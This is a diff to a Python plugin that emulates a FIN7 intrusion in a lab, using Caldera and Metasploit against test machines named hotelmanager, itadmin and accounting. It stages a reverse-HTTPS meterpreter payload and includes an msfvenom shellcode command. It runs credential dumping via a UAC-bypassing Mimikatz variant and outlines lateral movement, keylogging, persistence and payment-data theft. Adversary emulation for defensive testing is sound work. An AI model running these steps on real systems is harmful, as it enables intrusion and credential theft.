@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 
 # Adversary emulation for FIN7
+import socket
 
-from plugins.base.attack import AttackPlugin
+from plugins.base.attack import AttackPlugin, Requirement
 from app.interface_sfx import CommandlineColors
-from app.metasploit import MSFVenom, MetasploitInstant
+from app.metasploit import MSFVenom
 import os
 import time
 
@@ -19,6 +20,8 @@ class FIN7Plugin(AttackPlugin):
 
     required_files_attacker = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
 
+    requirements = [Requirement.CALDERA, Requirement.METASPLOIT]
+
     ######
     payload_type_1 = "windows/x64/meterpreter/reverse_https"  # payload for initial stage
 
@@ -27,21 +30,24 @@ class FIN7Plugin(AttackPlugin):
         self.plugin_path = __file__
         self.metasploit_1 = None
 
-    def get_metasploit_1(self):
-        """ Returns a metasploit with a session for the first targeted machine """
-        if self.metasploit_1:
-            return self.metasploit_1
+    def get_metasploit_1(self, payload):
+        """ Returns a metasploit with a session for the first targeted machine
 
-        self.metasploit_1 = MetasploitInstant(self.metasploit_password, attack_logger=self.attack_logger, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
-        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1)
-        self.metasploit_1.wait_for_session()
-        return self.metasploit_1
+        @param payload: payload description. waiting for this payload. Like "windows/x64/meterpreter/reverse_https"
+        """
+        if self.metasploit:
+            return self.metasploit
+
+        self.connect_metasploit()
+
+        ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())
+        self.metasploit.start_exploit_stub_for_external_payload(payload=self.payload_type_1, lhost=ip)
+        self.metasploit.wait_for_session()
+        return self.metasploit
 
     def step1(self):
         self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1 (target hotelmanager): Initial Breach{CommandlineColors.ENDC}", 1)
-
-        self.attack_logger.start_narration(
-            "Step 1 (target hotelmanager): Initial Breach\n----------------------------")
+        self.attack_logger.start_attack_step("Step 1 (target hotelmanager): Initial Breach")
         self.attack_logger.start_narration("""
 NOT IMPLEMENTED YET
 
@@ -68,8 +74,7 @@ This is the initial attack step that requires user interaction. Maybe it is bett
 
     def step2(self):
         self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 2 (target hotelmanager): Delayed Malware Execution{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 2 (target hotelmanager): Delayed Malware Execution\n----------------------------")
+        self.attack_logger.start_attack_step("Step 2 (target hotelmanager): Delayed Malware Execution")
         self.attack_logger.start_narration("""
 NOT IMPLEMENTED YET
 
@@ -92,7 +97,7 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
     def step3(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 3 (target hotelmanager): Target Assessment{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration("Step 3 (target hotelmanager): Target Assessment\n----------------------------")
+        self.attack_logger.start_attack_step("Step 3 (target hotelmanager): Target Assessment")
 
         # TODO: Make sure logging is nice and complete
 
@@ -179,7 +184,6 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
         # Generate shellcode
         # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
 
-
         dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp"
         architecture = "x64"
         target_platform = "windows"
@@ -238,7 +242,7 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
         # base64 conversion
         self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_4; base64 babymetal.bin > {encoded_filename}")
 
-        self.attack_logger.stop_build(logid = logid)
+        self.attack_logger.stop_build(logid=logid)
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}Step 4 compiling tools{CommandlineColors.ENDC}", 1)
@@ -250,8 +254,7 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
         """
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 4 (target hotelmanager): Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 4 (target hotelmanager): Staging Interactive Toolkit\n----------------------------")
+        self.attack_logger.start_attack_step("Step 4 (target hotelmanager): Staging Interactive Toolkit")
         self.attack_logger.start_narration("""
 In the original attack Babymetal payload is a dll. Currently we are using a simplification here (directly calling a exe). The original steps are:
 * Target already runs adb156.exe. This one gets the shellcode over the network connection and decodes it.
@@ -271,8 +274,10 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
 
         # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps.
 
+        payload = self.payload_type_1
+
         venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
-        venom.generate_and_deploy(payload=self.payload_type_1,
+        venom.generate_and_deploy(payload=payload,
                                   architecture="x64",
                                   platform="windows",
                                   lhost=self.attacker_machine_plugin.get_ip(),
@@ -288,9 +293,10 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
         # TODO: invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
         # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/Resources/Step4/babymetal/Invoke-Shellcode.ps1
 
-        # metasploit1 = self.get_metasploit_1()
-        # print("Got session, calling command")
-        # print(metasploit.meterpreter_execute_on(["getuid"], hotelmanager))
+        metasploit1 = self.get_metasploit_1(payload)
+        print("Got session, calling command")
+        print(metasploit1.meterpreter_execute_on(["getuid"], hotelmanager))
+        print("Should have called session now")
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
@@ -298,13 +304,14 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
     def step5(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 5 (target hotelmanager): Escalate Privileges{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 5 (target hotelmanager): Escalate Privileges\n----------------------------")
+        self.attack_logger.start_attack_step("Step 5 (target hotelmanager): Escalate Privileges")
 
         hotelmanager = self.get_target_by_name("hotelmanager")
 
+        payload = self.payload_type_1
+
         # This is meterpreter !
-        metasploit = self.get_metasploit_1()
+        metasploit = self.get_metasploit_1(payload)
 
         # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute ps -ax through meterpreter{CommandlineColors.ENDC}", 1)
@@ -379,12 +386,14 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
                                                                situation_description="Executing Mimikatz through UAC bypassing powershell",
                                                                countermeasure="Behaviour detection"
                                                                )
-            print(metasploit.meterpreter_execute_on([execute_samcats], hotelmanager, delay=20))
+            result = metasploit.meterpreter_execute_on([execute_samcats], hotelmanager, delay=20)
+            print(result)
             self.attack_logger.stop_metasploit_attack(source=self.attacker_machine_plugin.get_ip(),
                                                       target=hotelmanager.get_ip(),
                                                       metasploit_command=execute_samcats,
                                                       ttp="T1003",
-                                                      logid=logid)
+                                                      logid=logid,
+                                                      result=result)
 
         # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/
 
@@ -472,8 +481,7 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
     def step6(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 6 (target hotelmanager -> itadmin): Expand Access{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 6 (target hotelmanager and itadmin): Expand Access\n----------------------------")
+        self.attack_logger.start_attack_step("Step 6 (target hotelmanager and itadmin): Expand Access")
         self.attack_logger.start_narration("""
 NOT IMPLEMENTED YET. NEEDS A SECOND MACHINE FOR LATERAL MOVEMENT
 * powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
@@ -534,8 +542,7 @@ NOT IMPLEMENTED YET. NEEDS A SECOND MACHINE FOR LATERAL MOVEMENT
     def step7(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 7 on itadmin: Setup User Monitoring{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 7 (target itadmin): Setup User Monitoring\n----------------------------")
+        self.attack_logger.start_attack_step("Step 7 (target itadmin): Setup User Monitoring")
         self.attack_logger.start_narration("""
 NOT IMPLEMENTED YET. A REPLACEMENT FOR THE ALOHA COMMAND CENTER IS NEEDED
 
@@ -570,8 +577,7 @@ NOT IMPLEMENTED YET. A REPLACEMENT FOR THE ALOHA COMMAND CENTER IS NEEDED
     def step8(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 8 (target: itadmin as domain_admin): User Monitoring{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 8 (target itadmin): User Monitoring\n----------------------------")
+        self.attack_logger.start_attack_step("Step 8 (target itadmin): User Monitoring")
         self.attack_logger.start_narration("""
 NOT IMPLEMENTED YET. MAYBE DO THIS PARTIAL. KEYLOGGING NEEDS USER INTERACTION.
 (Screen spying and keylogging are already implemented as standalone metasploit attacks. Use them)
@@ -622,7 +628,7 @@ NOT IMPLEMENTED YET. MAYBE DO THIS PARTIAL. KEYLOGGING NEEDS USER INTERACTION.
                                                lport=lport,
                                                filename=filename,
                                                for_step=for_step,
-                                               sRDI_conversion= sRDI_conversion,
+                                               sRDI_conversion=sRDI_conversion,
                                                encoded_filename=encoded_filename,
                                                comment="And SRDI converted Meterpreter shell. Will be stored in the registry.")
 
@@ -691,8 +697,7 @@ NOT IMPLEMENTED YET. MAYBE DO THIS PARTIAL. KEYLOGGING NEEDS USER INTERACTION.
     def step9(self):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 9 (target: accounting): Setup Shim Persistence{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 9 (target accounting): Setup Shim Persistence\n----------------------------")
+        self.attack_logger.start_attack_step("Step 9 (target accounting): Setup Shim Persistence")
         self.attack_logger.start_narration("""
 NOT IMPLEMENTED YET
 
@@ -730,11 +735,11 @@ NOT IMPLEMENTED YET
 
         filename = "AccountingIQ.exe"
         dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c"
-        logid = self.attack_logger.start_build(
-                                               filename=filename,
+        logid = self.attack_logger.start_build(filename=filename,
                                                for_step=10,
                                                dl_uri=dl_uri,
-                                               comment="This is a simulated credit card tool to target. The final flag is in here.")
+                                               comment="This is a simulated credit card tool to target. The final flag is in here."
+                                               )
         # simulated credit card tool as target
         self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_10")  # MSFVenom needs to be installed
         self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_10; rm {filename}")
@@ -782,8 +787,7 @@ NOT IMPLEMENTED YET
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 10 (target: accounting): Steal Payment Data{CommandlineColors.ENDC}", 1)
-        self.attack_logger.start_narration(
-            "Step 10 (target accounting): Steal Payment Data\n----------------------------")
+        self.attack_logger.start_attack_step("Step 10 (target accounting): Steal Payment Data")
         self.attack_logger.start_narration("""
 NOT IMPLEMENTED YET. NEEDS TARGET REBOOTING: NO IDEA IF ATTACKX CAN SUPPORT THAT
 
